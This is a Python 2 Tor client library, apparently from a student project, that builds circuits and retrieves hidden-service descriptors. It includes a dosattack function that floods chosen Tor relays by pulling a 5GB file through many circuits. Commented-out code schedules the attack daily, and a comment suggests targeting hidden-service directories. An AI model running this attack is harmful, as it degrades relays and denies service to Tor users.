from StringIO import StringIO
import cStringIO
import binascii
from collections import namedtuple
import pprint
import os
import time
import ssl,socket,struct
from binascii import hexlify
import sys
import itertools
import consensus
import sys
import base64
import urllib2
import zlib
from Crypto.Hash import SHA
import unittest
import threading
import struct
import string
from time import sleep

from torfuncs import *
from rendFuncs import *
# from attack import *
from errors import *


   #      0 -- PADDING     (Padding)
   #      1 -- CREATE      (Create a circuit)
   #      2 -- CREATED     (Acknowledge create)
   #      3 -- RELAY       (End-to-end data)
   #      4 -- DESTROY     (Stop using a circuit)
   #      5 -- CREATE_FAST (Create a circuit, no PK)
   #      6 -- CREATED_FAST (Circuit created, no PK)
   #      8 -- NETINFO     (Time and address info)
   #      9 -- RELAY_EARLY (End-to-end data; limited)
   #      10 -- CREATE2    (Extended CREATE cell)
   #      11 -- CREATED2   (Extended CREATED cell)

   # Variable-length command values are:
   #      7 -- VERSIONS    (Negotiate proto version)
   #      128 -- VPADDING  (Variable-length padding)
   #      129 -- CERTS     (Certificates)
   #      130 -- AUTH_CHALLENGE (Challenge value)
   #      131 -- AUTHENTICATE (Client authentication)
   #      132 -- AUTHORIZE (Client authorization)    (Not yet used)


#########################################################################################################
# This is the main directoy of the Tor library application. Here will handle all the main comands such as
# creating circuits through Tor, or calling other directories functions such as the decryption of packets
# or creating circuits to hidden services
#########################################################################################################

# This is a set variable as defined in the Tor documentation 
# 512 - COMMAND_LEN - PAYLOAD_LEN = 512 - 1 - 509 = 2
CIRCID_LEN = 2

# This is the recieved cell function, it takes a recieved packet and unpacks it into 4 variables, 
# the circuit id, the packet command number, length of the payload and then the payload itself
# these variables are able to be used later on to dcrypt the payload etc
# sock is TCP socket/SSL socket
# specify waitFor as cmd ID if should wait for that packet (ignores all others)
def recvCell(sock, waitFor = 0):
        while True:
                hdr = sock.recv(3)
                circid, cmd = struct.unpack(">HB", hdr[0:3])
                ln = 509
                if cmd == 7 or cmd >= 128:
                        ln = struct.unpack(">H", sock.recv(2))[0]
                pl = sock.recv(ln)

                print "got pkt circ ",circid, " cmd", cmd
                if cmd == waitFor or waitFor == 0:
                        print "Return pkt circ ",circid, " cmd", cmd
                        return { 'circId': circid, 'cmd': cmd, 'len': ln, 'pl': pl}

# builds the version cell's payload 
# Input is a variable (integer) of what versions you wish to acept e.g 3
# Output is the accept version packed ready to be used a payload of a cell to be sent
def buildVersions(acceptVersions):
        pkt = ''
        for v in acceptVersions:
                pkt += struct.pack(">H", v)
        return pkt


#Function to connect to the first node, used for Netinfo version cell etc 
def first_node(name): #Takes ip + port or onion name  (IP + PORT needs to be in the format  xxx.xxx.xxx.xx:xxxx)
    match = re.search(r'(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?', name) #Reg ex for an ip address and port 
    if match:
        # print "IP address inputted" #testing
        ip, port = name.split(":")
        ssl_sock.connect((ip, int(port)))
        print "successfully connected to the first node"
    else:
        print "Onion name inputted"
        identity, ip, or_port, onion_key = calc_rendezvous_point_data(name)
        # print ip #testing
        ssl_sock.connect((ip, int(or_port)))
        print "successfully connected to the first node"

## Functon to send the version cell, tidying up code
def version_to_send(version):                                                                                                                                     
    print "version to be sent:", version
    verPl = buildVersions([ version ]) #creates the version cell, here we will only support V3
    verCell = buildCell(0, 7, verPl) #Creates the packet ready to be sent containing the supported version
    ssl_sock.send(verCell) # Sends the packet

# This function requires an input of the payload of a recieved packet (NetInfo)
# it will then unpack the payload to reveal the contained data
# it handles both IPV4 and IPV6 addresses, as well as multiple addresses 
# it returns a dictionary containing the contained data such as timestap, our ip address version etc
# to be used later on for sending a NetInfo packet back
def decodeNetInfo(pl):
    payload = pl
    tm = struct.unpack(">I", payload[0:4])[0] #Extracts the timestamp from the payload
    our_or_ip_version = struct.unpack(">B", payload[4])[0] #Extracts our ip version from the payload
    our_or_addr_len = struct.unpack(">B", payload[5])[0] #Extracts the length of the ip address (4 or 16)
    
    if our_or_addr_len == 4: #If the address is length 4 (IPV4) it will extract the IPV4 address contained within the payload as well as extracting the other users IP address
        our_op_ip = struct.unpack(">BBBB", payload[6:10]) #Extracts our ip address from the payload
        num_their_ips = struct.unpack(">B", payload[10])[0] #Extracts the number of the other users / server IP addresses contained within the packet
        len_their_ips = struct.unpack(">B", payload[12])[0] #Determines if the IP addresses contained are IPV4 or IPV6                                                                          
        # This loop upacks their ip addresses, and handles if multiple addresses are present 
        # Much better way to unpack the packet, does unpacking dynamically rather than set values
        byte_string = '>{}'.format('B'*len_their_ips)
        their_ips = []
        for count in range(num_their_ips):
            start = 13 + (count*len_their_ips)
            end = start + len_their_ips
            ip = struct.unpack(byte_string, payload[start:end])
            their_ips.append(ip)

    #Only run if our address contained in the payload is an IPV6  
    elif our_or_addr_len == 16:
        our_op_ip = struct.unpack(">BBBBBBBBBBBBBBBB", payload[6:22]) #Extracts our IPV6 address
        num_their_ips = struct.unpack(">B", payload[22])[0] #Extracts the number of the other users / server IP addresses contained within the packet
        len_their_ips = struct.unpack(">B", payload[23])[0] #Determines if the IP addresses contained are IPV4 or IPV6    

        byte_string = '>{}'.format('B'*len_their_ips)
        their_ips = []
        for count in range(num_their_ips):
            start = 24 + (count*len_their_ips)
            end = start + len_their_ips
            ip = struct.unpack(byte_string, payload[start:end])
            their_ips.append(ip) #Updates the ip varaible with the IP address found in this loop

    #Setting their Ip version
    if len_their_ips == 16:
        version_their_ips = 6
    elif len_their_ips == 4:
        version_their_ips = 4

    our_op_ip = [int(i) for i in our_op_ip]
    their_ips = [map(int, x) for x in their_ips]
    their_ips = list(itertools.chain.from_iterable(their_ips))

    return { 'tm': tm, 'our_or_ip_version': our_or_ip_version, 'our_or_addr_len': our_or_addr_len, 'our_op_ip': our_op_ip, 'version_their_ips': version_their_ips, 'num_their_ips': num_their_ips, 'len_their_ips': len_their_ips, 'their_ips': their_ips }

#Function which takes the recieved netinfo cel and proccesses it and sends the netinfo cell bac to the first client
#Nothing is returned 
def receive_send_netinfo(recv_packet):
    srv_decode_NetInfo = decodeNetInfo(srv_netinfocell['pl']) # proccess the payload from the netinfo cell
    srv_NetInfo_To_Send = NetInfoToSend(**srv_decode_NetInfo) # Uses the decoded infomration from the Netinfo cell recieved to be passed to the function which will create the NetInfo cell to be sent to the node
    netinfoCell = buildCell(0, 8, srv_NetInfo_To_Send) #Builds the packet
    ssl_sock.send(netinfoCell) # Sends the packet
    print "netinfo sent" #Informing the user the NetInfo packet was sent    


# This function takes inputs of a timestamp, our ip address version, length of our ip address, our ip address, the version of the others ip address, 
# how many ip address they have as well as their ip addresses
# It takes the inputs and then packs these using stucts to ensure to correct format is used
# it returns a variable conatining packed inputs to be used as a pyload of a NetInfo packet
def NetInfoToSend(tm, our_or_ip_version, our_or_addr_len, our_op_ip, version_their_ips, num_their_ips, len_their_ips, their_ips):
    CellNetInfopkt = struct.pack(">I", time.time())

    #peerAddress is used to get the address of the connected Tor node, rather than using the value from the NetInfo packet is becuase we
    #have already connected to the first node earlier on and its simplier to connect to this ip address rather than trying the possible 
    #multiple addresses recieved in the NetInfo cell 
    # print "peerAddress",peerAddress #Testing to enure the correct address is used
    # print "peerAddress type", type(peerAddress) #Testing ensure the type is correct   

    #Makes sure the peer adress is contained within their ip address varible 
    # assert peerAddress ==their_ips[0]

    #Packs the variables to the CellNetInfopkt variable in the correct order and format
    CellNetInfopkt += struct.pack(">B", 4)
    CellNetInfopkt += struct.pack(">B", 4)
    CellNetInfopkt += struct.pack("B" * len(peerAddress), *peerAddress) #Allows for both IPV4 and IPV6 addresses to be packed (Does this dynamically)

    CellNetInfopkt += struct.pack(">B", 1)

    # adress format is a type/length/value
    CellNetInfopkt += struct.pack(">B", our_or_ip_version) # IPV4
    CellNetInfopkt += struct.pack(">B", our_or_addr_len) #
    CellNetInfopkt += struct.pack("B" * len(ownAddress), *ownAddress) #Allows for both IPV4 and IPV6 addresses to be packed (Does this dynamically)

    #returns a variable containing the passed variables in the correct format to be used as the payload of a NetInfo cell
    return  CellNetInfopkt

#Creates a rendv. point no inputs required, uses previously sed variables etc
def create_rendv_point():
    rendezvous_cookie = create_rendezvous_cookie() # Creates the rendv. cookie
    rendezvous_cookie_payload = circ_to_rend.rendezvous_point_payload(rendezvous_cookie) #Creates the payload of packet containing the rendv. cookie
    circ_to_rend.establish_rendezvous_point(1, rendezvous_cookie_payload) #Sends the cookie to establish the rendv. point 
    relayData = recvCell(ssl_sock) #recieves the data
    data = circ_to_rend.recievedStreamData(relayData['pl'])  #Extracts and decrypts the data and assigns it to a variable; data
    # print data #Testing
    if (data['relayCmd']) != 39:
        relay_cmd_to_message(data['relayCmd'])
        no_rendv_point()

    assert (data['relayCmd']) == 39 #Make sure only a RELAY_COMMAND_RENDEZVOUS2EZVOUS_ESTABLISHED is recieved #Unittest
    return rendezvous_cookie

TOR_CIRCID_COUNTER = 1
class TorCircuit():
    def __init__(self, sock):
        global TOR_CIRCID_COUNTER
        self.hops = []
        self.circId = TOR_CIRCID_COUNTER
        TOR_CIRCID_COUNTER+=1
        self.socket = sock
        self.tempX = 0
        self.packetSendCount = 0
        self.cookie = []

# Function that encypts each relay cell before it is sent with the "onion skin" (Keys computed between all nodes, starting with the final node and encrypted backwards)
#parse relaycell as str
    def encrypt(self, relayCell):
        for hop in self.hops[::-1]:
            relayCell = hop.fwdCipher.encrypt(relayCell)
        return relayCell

# Function that encyrpts a relay cell with only the last node key, this was used during testing and bug finding
# Input is the relay cell before sent, and the output is the encrypted relay cell ready to be sent
    def encrypt_last_only(self, relayCell):
        for hop in self.hops[-1:]: #Makes sure it encrypts using the last node first and works backwards
            relayCell = hop.fwdCipher.encrypt(relayCell)
        return relayCell

# Function that decypts each relay cell recieved, starts with the first nodes calculated keys and works forward through each node
# Input is the relay cell recieved, and output is the decrypted relay cell
#parse relaycell as str
    def decrypt(self, relayCell):
        i = 0
        for hop in self.hops:
            relayCell = hop.decrypt(relayCell)
            if relayCell[1]==0 and relayCell[2]==0:
                # print "decrypt: hop #{} of {} {}".format(i, len(self.hops), hop)
                return relayCell
            i+=1
        return relayCell

    # Function to send the CREATE cell to the first node
    # Input is the onion name of the selected first node
    # This function creates the Client Handshake Data, packs this into a packet ready to be send, , before passing it to the send function to send the packet
    # Nothing is returned
    def toFirst(self, on):
        # ERROR FOUND HERE - USING GLOBAL!! FIXED - GARETH
        (self.tempX, create) = remoteKeyX(on)
        createcell = buildCell(self.circId, 1, create)
        self.socket.send(createcell)

    # This function handles the created cell recived to extract the contained data within it as well as appending the data contained within the packet to the hops object
    # the created cell is required as the input, nothing is outputed
    def handleCreated(self, cell):
        created = cell['pl']
        t1 = decodeCreatedCell(created, self.tempX)
        self.hops.append(t1)

    # Allows the extending of the circuit, it takes the stream id that will be used as well as the nickname of the node you wish to extend to
    # Calculates the handshake data, packs this with the stream id into a packet that will be sent, before passing it to the send function
    # Nothng is returned
    def extend(self, stream_id, on):
        (self.tempX, extend) = buildExtendPayload(on)
        extendr = buildRelayCell(self.hops[-1], 6, stream_id, extend)
        self.send(extendr)

    # Function to send the packet created down to the relevant node
    # Input is the packet, this gets encrypted using the onion encryption (Using handshake data previously calculated)
    # Assigns the relevent relay id
    # Builds the complete packet, and then sends the packet, and finally updates the packet send counter
    # Nothing is returned
    def send(self, packet):
        packetencrpyt = self.encrypt(packet)
        relayId = (9 if self.packetSendCount <8 else 3)
        self.socket.send(buildCell(self.circId, relayId, packetencrpyt)) # will need to monitor this, if packets sent >8 need to change relay type
        self.packetSendCount += 1

    # Function to decrypt and extract data contained with in the extended packet 
    # Input is the extended packet recieved
    # Fuction decrypts the packet, before extracting the shared key, and various other data contained within the packet
    # Appends the hop variable of the Tor circuit object with the data extracted from the extended packet
    # Nothing is returned
    def extendedRecieved(self, packet):
        extended = self.decrypt(packet)
        relayDecoded = decodeRelayCell(extended)
        payload = relayDecoded['pl']
        # print payload.encode('hex') #Testing, not added as contains no useful data to the user

        # ADD AFTER TESTING !

        if relayDecoded['relayCmd'] != 7:
            relay_cmd_to_message(relayDecoded['relayCmd']) #Informs the user of the relay cell that was recieved (in english not a number)
            sys.exit("Application quitting, due to not recieving the correct cell, pleases ensure everything is correct, however this error could be becuase the node no longer exists ")

        assert relayDecoded['relayCmd'] == 7 # checks to make sure the cell recieved is a RELAY_EXTENDED  #sometimes get an assertion #Testing

        t2 = decodeCreatedCell(payload, self.tempX)
        self.hops.append(t2)
        # return extended
        #return t2

    # This function creates a stream through the Tor network, to a webserver on the internet
    # Takes the input of stream ID, the ip address or web address of the webserver as well as the port of the web server
    # It correctly packs this data into a relay cell before passing it to the send function to be sent
    # Nothng is returned
    def createStream(self,strId, host, port):
        payload = host + ":" + str(port) + "\x00" + struct.pack(">L", 0)
        relay = buildRelayCell(self.hops[-1], 1, strId, payload)
        self.send(relay)#Passes the relay variable to the send function for it to be sent through the Tor network

    # This function creates a stream through the Tor network, to a hidden service
    # Takes the input of stream ID as well as the public key of the HS
    # It correctly packs this data into a relay cell before passing it to the send function to be sent
    # Nothng is returned
    def create_stream_hsdir(self,strId, host):
        payload = host + "\x00" + struct.pack(">L", 0) #Correctly formats the data into the payload of the cell
        relay = buildRelayCell(self.hops[-1], 13, strId, payload)  #13 -- RELAY_BEGIN_DIR
        self.send(relay) #Passes the relay variable to the send function for it to be sent through the Tor network

    # Function which ensures the stream has been successfuly set up and now can be used to send data to the webserver
    # Input is a packet of data, and this decodes the packet to ensure a RELAY_CONNECTED cell was recieved
    # Nothing is returned
    def streamRecieved(self, packet):
        connected = self.decrypt(packet)
        # print connected.encode('hex')

        relayDecoded = decodeRelayCell(connected)
        # Just ensures a RELAY_CONNECTED cell is recieved else it gives the user an error message
        if(relayDecoded['relayCmd'] != 4):
            # print relayDecoded['pl'].encode('hex') #Testing
            relay_cmd_to_message(relayDecoded['relayCmd']) #Informs the user of the relay cell that was recieved (in english not a number)
            error_type_to_message(relayDecoded['pl'].encode('hex')) #Informs the user of the error message that was recieved (in english not a number)
            sys.exit("Stream has not been succesfully connected, system exiting")
        assert relayDecoded['relayCmd'] == 4 # Otherwise the relay_connect have not been recieved (Usually down to a time out) #Testing
        # Do above a bit nicer

    # This function sends the data to be sent to through the Tor network to the webserver
    # Input is stream id and data (GET request etc)
    # This then gets packed and passed to the send function to be sent 
    def streamData(self,strId, data):
        relay = buildRelayCell(self.hops[-1], 2, strId, data)
        #relay = self.encrypt(relay)
        self.send(relay)

    # Function which tkes the packet of the recieved stream data and then decrypts it before returning the data to the user decrypted
    def recievedStreamData(self, packet):
        data = self.decrypt(packet)
        relayDecoded = decodeRelayCell(data)
        return relayDecoded

    # This function creates the payload for the rendezvous point
    # takes an input of the rendezvous cookie, a 20 bit random value
    # adds the cookie value to the Tor circuit object for use later on
    # packs the value correctly ready to be used as a payload before returning this value to the user
    def rendezvous_point_payload(self, rendezvous_cookie):
        if self.cookie != []:
            self.cookie.pop
        self.cookie.append(rendezvous_cookie)  #keeps it for use later on
        payload = struct.pack ('!20s',rendezvous_cookie)
        return payload

    # Function used to establish a rendv point, input is the stream Id and the payload (rendezvous_point_payload)
    # This gets correctly formatted to a cell that can be sent, before being passed to the send function to be sent
    # Nothing is returned 
    def establish_rendezvous_point(self, strId, payload):
        relay = buildRelayCell(self.hops[-1], 33, strId, payload)
        self.send(relay)

    # This function connects to an induction point of a selected HS (Introduction: from Alice's OP to Introduction Point)
    # V2 Intro protocol
    # This is the first stage in allowing a client to talk to the hidden service, as it first needs to tell the HS where the rendvous point is
    # Takes the input of the stream id, Identifier for Bob's PK, the ip address for the rendvous point, as well as the onion point, identity ID, onion key (public key), the rendv. cookie calculated previously 
    def a_op_to_induction_point(self, strId, pk,rp_address, rp_or_port, rp_id, rp_ok, rc):
        # PK_ID  Identifier for Bob's PK      [20 octets]
        PK_ID = hash_item(pk)
        assert len(PK_ID) == 20 #Makes sures the pk id is length 20, this means the correct value was passed, mostly used for testing

        if len(PK_ID) != 20:
            incorrect_key_len()

        x, data = a_op_to_induction_point_v2( pk, rp_address, rp_or_port, rp_id, rp_ok, rc) #Passes value to a_op_to_induction_point_v2 in rendFuncs, this packs the data to the correct format as well as calculate the shared keys
        #Data has already been hybrid encypted in the a_op_to_induction_point_v2 function, No need to do it again ! 
        payload = PK_ID + data #Appends the data to the PK_ID which is required to be in plaintext

        cell = buildRelayCell(self.hops[-1], 34, strId, payload) #Builds the packet as normal, 34 is RELAY_COMMAND_INTRODUCE1
        self.send(cell) #Pass the cell to be sent through the Tor circtuit as normal
        # self.hops.append(self.tempX)
        # return self.tempX
        return x #returns x that was calculated to the user


    # This function connects to an induction point of a selected HS (Introduction: from Alice's OP to Introduction Point)
    # V3 Intro protocol
    # This is the first stage in allowing a client to talk to the hidden service, as it first needs to tell the HS where the rendvous point is
    # Tkaes the input of the stream id, Identifier for Bob's PK, the ip address for the rendvous point, as well as the onion point, identity ID, onion key (public key), the rendv. cookie calculated previously 
    def a_op_to_induction_point_v3_spec(self, strId, pk,rp_address, rp_or_port, rp_id, rp_ok, rc):
        PK_ID = hash_item(pk)

        assert len(PK_ID) == 20

        if len(PK_ID) != 20:
            incorrect_key_len()
        
        x, data = a_op_to_induction_point_v2( pk, rp_address, rp_or_port, rp_id, rp_ok, rc)      
        payload = PK_ID + data
        cell = buildRelayCell(self.hops[-1], 34, strId, payload)
        self.send(cell)
        return x

    #########################################
    def handle_hs(self, pl, x):
        t3 = decodeCreatedCell(redv_payload, x) 
        self.hops.append(t3)   

    # Creates a stream to the hidden service to allow GET requests etc to be sent to the HS
    # Input required is the stream id of the ciruit as well as the hidden service port
    # This is then packed into the correct format, create a packet before being sent down the Tor circuit
    def create_stream_hs(self,strId, port):
        payload = "" + ":" + str(port) + "\x00" + struct.pack(">L", 0)
        relay = buildRelayCell(self.hops[-1], 1, strId, payload)
        self.send(relay)

# Function for creating circuits, much better to do it in a function rather than step bby step, reduces code repeation etc
# Input is an array of hops (nodes) which the circuit will be created of
def create_circuits(circ_name, hops):
    circ_name.toFirst(hops[0]) #Easily retireves the first hope from the array, rather than having the user have to pass another value, reduces the risk of error
    created = recvCell(ssl_sock) #Recieves a cell, passes to the recvCell function to extract the data from it before being assign to the variable created
    assert created['circId'] == circ_name.circId and created['cmd'] == 2 #Makes sure a created packet is returned used for unittest

    if created['circId'] != circ_name.circId or created['cmd'] != 2: #If they do not match an error message will be displayed and application quits
        circId_cmd_error(created['circId'], created['cmd']) #Passes values to the error directory, to enable a customized message to be displayed, helps with useability

    circ_name.handleCreated(created) #Passes the created cell to the function handleCreated to decode and extract information from

    count=0 #Sets the start value of count variable
    for hop in hops[1:]: #Starts at the 2nd node in the hop list, this is becuase the first hop has already been connected to etc.
        print "hop :", hop #Testing
        circ_name.extend(0, hop) #Passing the onion nickname of the node to the extend function, to extend the length of the circuit 
        extended = recvCell(ssl_sock)#Recieves a cell, passes to the recvCell function to extract the data from it before being assign to the variable extended
        print "extended" #Used for testing purposes 
        if extended['cmd'] == 4: #Checks to make sure a destroy cell is not recieved
            destory_cell()
            # print "Destroy cell recieved"
            # print extended
            # print "Exiting now"
            # break

        if extended['circId'] != circ_name.circId or extended['cmd'] != 3:
            circId_cmd3_error(extended['circId'], extended['cmd'])

        assert extended['circId'] == circ_name.circId and extended['cmd'] == 3 #used for unittest

        circ_name.extendedRecieved(extended['pl']) #Handles the extended packet recieved, it is passed to the function extedndedRecieved in order for ti to be decrypted and have the shared key and data extracted from it
        count = count + 1 #Adds one to the count 
        print "success, hop ",count #Testing and also informing the user this proccess was successfuly and they have x many hops in their circuit

#This function conducts the bandwidth saturation DoS attack as explained in the report. This may not necessarily be left in if this library was to be published but did allow the attack to be conducted and the results to be analysed 
# Takes an input of a array list of nodes which will be used to create the citcuit
# These nodes are all of the nodes that will be targeted during this attack
def dosattack(circ):
    circ = TorCircuit(ssl_sock)
    create_circuits(circ,hops_in_circ)

    #Testing to ensure that a stream can be sent through the tor network and out to a server
    circ.createStream(1, "82.26.108.68", 80) #My personal raspberry pi file server containing the attack file (5gb DAT file)
    connected = recvCell(ssl_sock)
    # print connected

    # circ_to_rend.streamRecieved(connected['pl'])
    # print "Stream successfully established"
    # data = "GET /venom.jpg HTTP/1.1\r\nHost: 82.26.108.68\r\n\r\n" #Was a test file, and image of a few mb
    data = "GET /dosfile.dat HTTP/1.1\r\nHost: 82.26.108.68\r\n\r\n" #5GB target file #Sets the GET request for use later on
    # circ_to_rend.streamData(1, data)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
    # # Retrieves the data recieved from the request, looking for a 200 back
    # stream_data = []
    # while True:
    #    relayData = recvCell(ssl_sock)
    #    data = circ_to_rend.recievedStreamData(relayData['pl'])
    #    if (data['relayCmd']) == 3:
    #        break
    #    # print data['pl']
    #    stream_data.append(data['pl'])
    # # print stream_data

    print "circuit creation"
    # Test to create 10 circuits and streams 
    # Was found to be best to create the multiple circuits first and then create the streams as otherwise this caused connection refused errors, like to the be down to the concensus server
    storage = [] # Empty list to store all the circuits
    for n in range(10): #Can be any number, on a more capable server this could be 20 etc, thus making this more effective
        circuit = TorCircuit(ssl_sock)
        create_circuits(circuit, hops_in_circ)
        print "circuit", circuit
        # circuit.createStream(1, "82.26.108.68", 80)
        # connected = recvCell(ssl_sock)
        storage.append(circuit) # Add the circuit to the list

    # print "storage", storage # Testing

    # circ_to_rend = TorCircuit(ssl_sock)
    # create_circuits(circ_to_rend,hops_in_circ)
    # Makes a stream through each of the circuits to the target webserver
    for circuit in storage:
        circuit.createStream(1, "82.26.108.68", 80)
        relayData = recvCell(ssl_sock)
    #    data = circ_to_rend.recievedStreamData(relayData['pl'])
    #    if (data['relayCmd']) == 3:
    #        break
    #    # print data['pl']        print "connected"

    #Attack to be conducted,Requests the target file from each circuit and stream
    i = 1    
    for i in range(10):
        for circuit in storage:
            circuit.streamData(1, data)
            print "download of file"
            Data = recvCell(ssl_sock)
        i = i + 1 

#####################################################################################
######## End of functions - Now are the commands to call the functions etc ##########
#####################################################################################

consensus.fetchConsensus() #Retrieves the consensus 


s = socket.socket()
ssl_sock = ssl.wrap_socket(s)
first_node("orion") #Can either be a ip address and port in format xxx.xxx.xx.xx:xxxx or an onion router nickname

peerAddress = map(int,ssl_sock.getpeername()[0].split(".")) #Gets the ip address and port for the other nodes server, will be used later on
ownAddress = map(int,ssl_sock.getsockname()[0].split(".")) #Gets the ip address and port for the client, used later on 

version_to_send(3)#Tells the firt node what version we suppot

srv_netinfocell = recvCell(ssl_sock, 8) # Looks out for an command id of 8 which is a netinfo cell, this is then assigned to a variable before letting the user know it is recieved
receive_send_netinfo(srv_netinfocell['pl'])

hops_in_circ =  ["orion", "IPredator"] # What nodes would be required in the circuit, lowest is one, there is no upper limit

# Makes sure the hope_in_circ variable is not empty and there are nodes to create the circuit with 
if not hops_in_circ:
    no_nodes()#Error message from the error directory

#### Calls the DoS atack (bandwidth saturation), currenly commented out as do not need to be run all the time
# dosattack(hops_in_circ)

#### This allows the attack to be scheduled, making it a very effective attack for attacking small nodes with bandiwdth limits (Remove the hash to run this section)
# print "starting attack, once every 24 hours"
# attack = RepeatedTimer(1440, dosattack, hops_in_circ) # 1440 minutes = 24 hours
# sys.exit(0) # To prevent hte rest of the code from running uncomment this out, use if using the above attack

circ_to_rend = TorCircuit(ssl_sock) #Creates a new object, this will be used for creating a circuit to the rendvous point
create_circuits(circ_to_rend,hops_in_circ) #Creates a circuit using the hops in the circuit above, this will be used for the rendv point as well as making streams to the internet etc
                     
# ########## Enable to create a stream and retrieve data ############
# #Testing to ensure that a stream can be sent through the tor network and out to a server
# circ_to_rend.createStream(1, "82.26.108.68", 80) #My personal raspberry pi file server #Currently offline
# connected = recvCell(ssl_sock) # Assigns the recieved packet to the connected variable
# circ_to_rend.streamRecieved(connected['pl']) # Passes the payload of the packet recieved to the stream recieved function, this is to make sure the 
# print "Stream successfully established" # Just informing the user of 
# data = "GET /venom.jpg HTTP/1.1\r\nHost: 82.26.108.68\r\n\r\n" # Small Jpeg image of a few mb, just to test the stream will fetch all data etc.
# circ_to_rend.streamData(1, data) #Sends the data above (GET request normally) to the selected webserver
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
# # Retrieves the data recieved from the request, have used a loop here, as during the tetsing it was found that a single packet recieved does not contain all the information, and it a loop 
# # was required to retrieve all the data
# stream_data = []
# while True:
#    relayData = recvCell(ssl_sock)
#    data = circ_to_rend.recievedStreamData(relayData['pl'])
#    if (data['relayCmd']) == 3: # When a relay command is recieved, it indicates all data has been recieved and there is no more to come
#        break
#    print data['pl']
#    stream_data.append(data['pl'])
# # print stream_data #testing

# idnxcnkne4qt76tg.onion It is the homepage of the Tor project

print "Retriving hidden service descriptor" #Keeping the user informed
#"kpvz7ki2v5agwt35"#Hidden Wiki   #"3g2upl4pq6kufc4m"#duck duck go     #"idnxcnkne4qt76tg" #homepage of the Tor project   #All various hidden service addresses, some dont work as temporarily gone down etc
onion_Add = "kpvz7ki2v5agwt35" #Hidden service address , can be with or without the .onion at the end
onion_Add = remove_of_onion(onion_Add) # Removes the .onion from the address if it has it, reduces the chance of user error

responsible_HSDir_list = [] #Setting up variables to take an array list to be used later on
descriptor_id_list = [] #Setting up variables to take an array list to be used later on

for i in range(0, 2):
    descriptor_id = get_descriptor_Id(onion_Add, i) #Passes the onion address and i to the get_descriptor_id function in rendFunccs ("descriptor-id" is a identifier that is calculated by the hidden service and its clients)
    descriptor_id_list.append(descriptor_id) # Makes sure all 3 desciptor ids are stored
    responsible_HSDir = find_responsible_HSDir(descriptor_id)# Passes the descriptor to the find_responsible_HSDir function in rendFunccs (returns the responsible hidden service directories for the selected hidden service)
    responsible_HSDir_list.append(responsible_HSDir) # Saves all responsible HSDir information in a list to use later (3 responsible hidden service directories)

### Can also use the responsible_HSDir_list to be used as the circuit for the DoS attack, as this can prevent any users connecting to a hidden service ###
# print "responsible_HSDir_list", responsible_HSDir_list # Just informs the user of the reponsible hidden service director server for a hidden service, #Too much data is confusing not shown to user, found after testing


ip_addresses, dirport, port, nickname, identity = extract_HSDir_data(responsible_HSDir_list) # Extracts the data from the reponsible Hidden service directories and assigns these to several variables for use later on
web_addresses = connect_to_web_lookup(ip_addresses, dirport, descriptor_id_list) # Creates the IP address with Port numbers for all the responsible hidden service directories

print "web addr", web_addresses # Keeps the user informed, also used for testing purposes


n = 1 # Change this value to select a different router to connect to
i = 0 # change between 0 - 1   releated to descriptor list
service_descriptor_data = "GET /tor/rendezvous2/"+ descriptor_id_list[i] +" HTTP/1.1\r\nHost: "+web_addresses[n]+"\r\n\r\n" #Formats the GET request reterive the service descriptor

#"GET HTTP/1.1\r\nHost:"+web_addresses[0]+"\r\n\r\n" #need to change so it loops through all web addresses if first fails etc
# print "service_descriptor_data to send", service_descriptor_data # Testing

rendezvous_point = hops_in_circ[(len(hops_in_circ)-1)] #Rendv. point is the last node in the hops_in_circ variable as selected earlier
print "hops_in_circ : "  ,hops_in_circ #circuit we will be using # Testing

rendezvous_cookie = create_rendv_point() #Calls a function to create the rendv.point                                                                    

## This creates the circuit to the induction point
hops_in_circ =  ["orion", "TorLand1"] #"WorldWithPrivacyNY1"  #Normal circuit with several nodes
hops_in_circ.append(nickname[n]) #first IP # Automatically adds the calculated induction point to the end of the circuit
print "hops_in_circ : "  ,hops_in_circ #circuit we will be using #Keeps the user informed as well as used for testing
# print  "No of hops in circ : ", len(hops_in_circ)  #Keeps the user informed as well as used for testing

#Creates new circuit to the HSDir server
circ_to_HSDir = TorCircuit(ssl_sock) #Creates a new object in Tor circuit called circ_to_HSDir
create_circuits(circ_to_HSDir, hops_in_circ) # Creates the circuit to HSDir

# print web_addresses[n] # Testing

#creates a stream to the HSDir server to send data down
circ_to_HSDir.create_stream_hsdir(2, web_addresses[n])
connected = recvCell(ssl_sock) 

print connected
print circ_to_HSDir.streamRecieved(connected['pl'])
print "Stream successfully established to HSDir"

# sends the get request to a directory server
circ_to_HSDir.streamData(2, service_descriptor_data)

file_to_save = descriptor_id_list[0]+".txt" #Creates the name for the txt file, using the desriptor id as it is unique for each HS
text_file = open(file_to_save, "w") # creates a file to write the data recieved from the stream, done ths so always got a copy, saves format etc

#Writes all of the payload to the text file, done in a loop to ensure all the document is downloaded and saved
while True:
    relayData = recvCell(ssl_sock)
    if relayData['circId'] != circ_to_HSDir.circId:
        circuit_id_missmatch()

    assert relayData['circId'] == circ_to_HSDir.circId #unittest
    data = circ_to_HSDir.recievedStreamData(relayData['pl'])
    if (data['relayCmd']) == 3: #End of stream data
        break
    # print data['pl'] # Testing, not printed out now as may confuse the user, not much useful infomation contained as all encrypted
    text_file.write(data['pl']) #Writes the payload to the text file
text_file.close() #Closes the files as it can be used later on with out any open errors as previously encountered
print "service descriptor successfully downloaded" #Keeping the user informed as well as for testing and bug finding

#Retrieves data from the document recieved
rend_service_descriptor, RSA_pub_key, secret_id_part, message_decrypted,  signature = decode_recieved_document(file_to_save) #Decodes and where neccessary decrypts the data and assigns the retreieved data into several variables

# print "message_decrypted\n\n", message_decrypted #Testing, not going to be used in the original developement as it will confuse the user

#saves  decrypted data to a text file
file_decrypted_to_save = descriptor_id_list[0]+"_decrypted.txt" #Sets the name, this is the same as the encrypted versio, just with decrypted added onto the end, make it easy to see which files are releated if this was required.
message_decrypted_file = open(file_decrypted_to_save, "w") #Opens the file and assigns the write permisson to it to allow the application to write the file.
message_decrypted_file.write(message_decrypted) #Writes the decrypted message to the file
message_decrypted_file.close() #Closes the file to be used again later

#Retrieves data from the decrypted version of the document recieved
